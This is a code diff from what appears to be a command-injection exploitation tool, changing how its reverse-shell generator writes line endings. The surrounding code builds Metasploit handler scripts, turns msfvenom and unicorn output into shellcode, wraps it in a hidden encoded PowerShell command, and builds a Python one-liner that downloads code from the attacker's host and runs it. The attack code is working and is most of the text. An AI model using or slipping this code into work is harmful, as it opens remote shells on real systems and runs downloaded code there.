@@ -227,17 +227,17 @@ def other_reverse_shells(separator):
 
         with open (output, "r+") as content_file:
           data = content_file.readlines()
-          data = ''.join(data).replace("\n",settings.SINGLE_WHITESPACE)
+          data = ''.join(data).replace(settings.END_LINE.LF,settings.SINGLE_WHITESPACE)
 
         settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
-          filewrite.write("use exploit/multi/handler\n"
-                          "set payload " + payload + "\n"
-                          "set lhost " + str(settings.LHOST) + "\n"
-                          "set lport " + str(settings.LPORT) + "\n"
-                          "exploit\n\n")
+          filewrite.write("use exploit/multi/handler" + settings.END_LINE.LF + 
+                          "set payload " + payload + settings.END_LINE.LF +
+                          "set lhost " + str(settings.LHOST) + settings.END_LINE.LF +
+                          "set lport " + str(settings.LPORT) + settings.END_LINE.LF +
+                          "exploit" + settings.END_LINE.LF * 2)
 
         if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
           checks.set_php_working_dir()
@@ -277,11 +277,11 @@ def other_reverse_shells(separator):
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
-          filewrite.write("use exploit/multi/handler\n"
-                          "set payload " + payload + "\n"
-                          "set lhost " + str(settings.LHOST) + "\n"
-                          "set lport " + str(settings.LPORT) + "\n"
-                          "exploit\n\n")
+          filewrite.write("use exploit/multi/handler" + settings.END_LINE.LF + 
+                          "set payload " + payload + settings.END_LINE.LF +
+                          "set lhost " + str(settings.LHOST) + settings.END_LINE.LF +
+                          "set lport " + str(settings.LPORT) + settings.END_LINE.LF +
+                          "exploit" + settings.END_LINE.LF * 2)
 
         if settings.TARGET_OS == settings.OS.WINDOWS:
           if not settings.USER_DEFINED_PYTHON_DIR:
@@ -331,7 +331,7 @@ def other_reverse_shells(separator):
             try:
               proc = subprocess.Popen("msfvenom -p " + str(payload) + " LHOST=" + str(settings.LHOST) + " LPORT=" + str(settings.LPORT) + " -f c -o " + output + settings.NO_OUTPUT, shell=True).wait()
               with open(output, 'r') as content_file:
-                repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', '\\x': ',0x', 'unsignedcharbuf[]=': ''}
+                repls = {';': '', ' ': '', '+': '', '"': '', settings.END_LINE.LF: '', 'buf=': '', '\\x': ',0x', 'unsignedcharbuf[]=': ''}
                 shellcode = reduce(lambda a, kv: a.replace(*kv), iter(repls.items()), content_file.read()).rstrip()[1:]
               # One line shellcode injection with native x86 shellcode
               # Greetz to Dave Kennedy (@HackingDave)
@@ -339,11 +339,11 @@ def other_reverse_shells(separator):
               other_shell = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))
               settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
               with open(output, 'w+') as filewrite:
-                filewrite.write("use exploit/multi/handler\n"
-                                "set payload " + payload + "\n"
-                                "set lhost " + str(settings.LHOST) + "\n"
-                                "set lport " + str(settings.LPORT) + "\n"
-                                "exploit\n\n")
+                filewrite.write("use exploit/multi/handler" + settings.END_LINE.LF + 
+                                "set payload " + payload + settings.END_LINE.LF +
+                                "set lhost " + str(settings.LHOST) + settings.END_LINE.LF +
+                                "set lport " + str(settings.LPORT) + settings.END_LINE.LF +
+                                "exploit" + settings.END_LINE.LF * 2)
               checks.msf_launch_msg(output)
             except:
               settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
@@ -373,17 +373,17 @@ def other_reverse_shells(separator):
                 checks.gen_payload_msg(payload)
                 subprocess.Popen("python unicorn.py" + settings.SINGLE_WHITESPACE + str(payload) + settings.SINGLE_WHITESPACE + str(settings.LHOST) + settings.SINGLE_WHITESPACE + str(settings.LPORT) + settings.NO_OUTPUT, shell=True).wait()
                 with open(output, 'r') as content_file:
-                  other_shell = content_file.read().replace('\n', '')
+                  other_shell = content_file.read().replace(settings.END_LINE.LF, '')
                 other_shell = _urllib.parse.quote_plus(other_shell)
                 settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                 # Remove the ouput file
                 os.remove(output)
                 with open("unicorn.rc", 'w+') as filewrite:
-                  filewrite.write("use exploit/multi/handler\n"
-                                  "set payload " + payload + "\n"
-                                  "set lhost " + str(settings.LHOST) + "\n"
-                                  "set lport " + str(settings.LPORT) + "\n"
-                                  "exploit\n\n")
+                  filewrite.write("use exploit/multi/handler" + settings.END_LINE.LF + 
+                                  "set payload " + payload + settings.END_LINE.LF +
+                                  "set lhost " + str(settings.LHOST) + settings.END_LINE.LF +
+                                  "set lport " + str(settings.LPORT) + settings.END_LINE.LF +
+                                  "exploit" + settings.END_LINE.LF * 2)
                 checks.msf_launch_msg("unicorn.rc")
                 # Return to the current path.
                 os.chdir(current_path)
@@ -423,14 +423,14 @@ def other_reverse_shells(separator):
         if 'payload' in locals():
           output = "web_delivery.rc"
           with open(output, 'w+') as filewrite:
-            filewrite.write("use exploit/multi/script/web_delivery\n"
-                            "set target " + str(int(web_delivery)-1) + "\n"
-                            "set payload " + payload + "\n"
-                            "set lhost " + str(settings.LHOST) + "\n"
-                            "set lport " + str(settings.LPORT) + "\n"
-                            "set srvport " + str(settings.SRVPORT) + "\n"
-                            "set uripath " + settings.URIPATH + "\n"
-                            "exploit\n\n")
+            filewrite.write("use exploit/multi/script/web_delivery"+ settings.END_LINE.LF +
+                            "set target " + str(int(web_delivery)-1) + settings.END_LINE.LF +
+                            "set payload " + payload + settings.END_LINE.LF +
+                            "set lhost " + str(settings.LHOST) + settings.END_LINE.LF +
+                            "set lport " + str(settings.LPORT) + settings.END_LINE.LF +
+                            "set srvport " + str(settings.SRVPORT) + settings.END_LINE.LF +
+                            "set uripath " + settings.URIPATH + settings.END_LINE.LF +
+                            "exploit" + settings.END_LINE.LF * 2)
 
           if web_delivery == '1':
             data = "import sys%3bimport ssl%3bu%3d__import__('urllib'%2b{2%3a'',3%3a'.request'}[sys.version_info[0]],fromlist%3d('urlopen',))%3br%3du.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "',context%3dssl._create_unverified_context())%3bexec(r.read())%3b"
